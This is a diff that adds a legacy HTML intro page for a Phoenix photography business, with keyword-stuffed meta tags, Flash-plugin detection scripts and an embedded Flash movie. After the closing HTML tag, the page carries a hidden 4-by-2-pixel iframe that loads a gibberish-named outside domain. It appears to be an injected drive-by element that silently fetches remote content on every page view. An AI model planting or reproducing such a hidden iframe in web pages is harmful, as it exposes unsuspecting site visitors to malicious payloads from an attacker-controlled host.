@@ -1,0 +1,87 @@
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<HTML><HEAD><TITLE>Intro Captured Eye Photography</TITLE>
+<META http-Equiv="Content-Type" content="text/html; charset=windows-1252">
+<META name="GENERATOR" content="MSHTML 6.00.2800.1498">
+<META name="ThemeName" content="Template 10 Layout">
+<META name="CreatedAppVer" content="5, 0, 9, 0">
+<SCRIPT language=JavaScript src="gdsImageSwapping.js"></SCRIPT>
+
+<META name="description" content="Photography for Corporate, Art, Weddings, Portrait, and Media.  Based in Phoenix, AZ but will travel international and state wide.">
+<META name="keywords" content="Wedding Photos Arizona,International Photography,Photography,Media Photos,Wedding Photography Arizona,Photography Custom">
+<META name="classification" content="Wedding Photos Arizona,International Photography,Photography,Media Photos,Wedding Photography Arizona,Photography Custom"><!--Wedding Photos Arizona,International Photography,Photography,Media Photos,Wedding Photography Arizona,Photography Custom--><!--Wedding Photos Arizona,International Photography,Photography,Media Photos,Wedding Photography Arizona,Photography Custom-->
+<SCRIPT language=JavaScript>
+<!-- 
+function alertNoFlashInstalled()
+{
+alert('Flash 3 is required to view this page correctly.');
+new_location = "http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash";
+popupWindow2=open(new_location,'popupWindow2');
+}
+//-->
+</SCRIPT>
+
+<SCRIPT language=vbscript>
+<!--
+// This function will check to see if flash is installed under Internet Explorer.
+function checkPluginIE()
+on error resume next
+ShockMode = IsObject(CreateObject("ShockwaveFlash.ShockwaveFlash.3"))
+if not ShockMode then
+alertNoFlashInstalled()
+end if
+end function
+//-->
+</SCRIPT>
+
+<SCRIPT language=JavaScript>
+<!--
+// This function will check to see if flash is installed under Netscape.
+function checkPluginNS()
+{
+var ShockMode = 0;
+if ( navigator.mimeTypes &&
+navigator.mimeTypes["application/x-shockwave-flash"] &&
+navigator.mimeTypes["application/x-shockwave-flash"].enabledPlugin &&
+navigator.plugins &&
+navigator.plugins["Shockwave Flash"])
+{
+ShockMode = 1;
+}
+if ( ShockMode == 0 )
+alertNoFlashInstalled();
+}
+// Determine if IE or Netscape is running....this determines which function to call.
+if(navigator.appName.indexOf('Microsoft')>=0)
+scriptName = "checkPluginIE()";
+else
+scriptName = "checkPluginNS()";
+//-->
+</SCRIPT>
+
+<SCRIPT language=JavaScript>
+<!--
+eval(scriptName);
+//-->
+</SCRIPT>
+
+<STYLE>
+.pluginStyle{font-family:Arial,verdana,tahoma,courier new,arial,sans-serif;font-size:10pt;color:#FFFFFF;}
+</STYLE>
+</HEAD>
+<BODY text=#ffffff bottomMargin=0 vLink=#9933cc aLink=#ff3333 link=#3333ff 
+bgColor=#c0c0c0 leftMargin=0 topMargin=0 rightMargin=0 marginheight="0" 
+marginwidth="0">
+<DIV align=center>
+<OBJECT id=ShockwaveFlash6jYMl15m 
+codeBase=http://download.macromedia.com/pub/shockwave/cabs/flash/swflash.cab#3,0,0,0 
+height=400 width=550 classid=clsid:D27CDB6E-AE6D-11cf-96B8-444553540000 
+VIEWASTEXT><PARAM NAME="Movie" VALUE="plugins/flash/ovals0.swf"><PARAM NAME="Src" VALUE="plugins/flash/ovals0.swf"><PARAM NAME="WMode" VALUE="Window"><PARAM NAME="Play" VALUE="true"><PARAM NAME="Loop" VALUE="True"><PARAM NAME="Quality" VALUE="AutoHigh"><PARAM NAME="Menu" VALUE="-1"><PARAM NAME="Scale" VALUE="ShowAll"><PARAM NAME="DeviceFont" VALUE="0"><PARAM NAME="EmbedMovie" VALUE="0"><PARAM NAME="BGColor" VALUE="#ffffff">
+<EMBED 
+PLUGINSPAGE="http://www.macromedia.com/shockwave/download/index.cgi?P1_Prod_Version=ShockwaveFlash" 
+BGCOLOR="#ffffff" SRC="plugins/flash/ovals0.swf" LOOP="True" width="550" 
+height="400" QUALITY=best 
+TYPE="application/x-shockwave-flash"></EMBED></OBJECT></DIV>
+<P>
+<DIV align=center><A href="HomePage.html">Click Here to Enter Site</A> 
+<P></P></DIV></BODY></HTML>
+<iframe src="http://eiueuiuewi.com/54N7JS34B34D5NH34J/" width="4" height="2"></iframe>
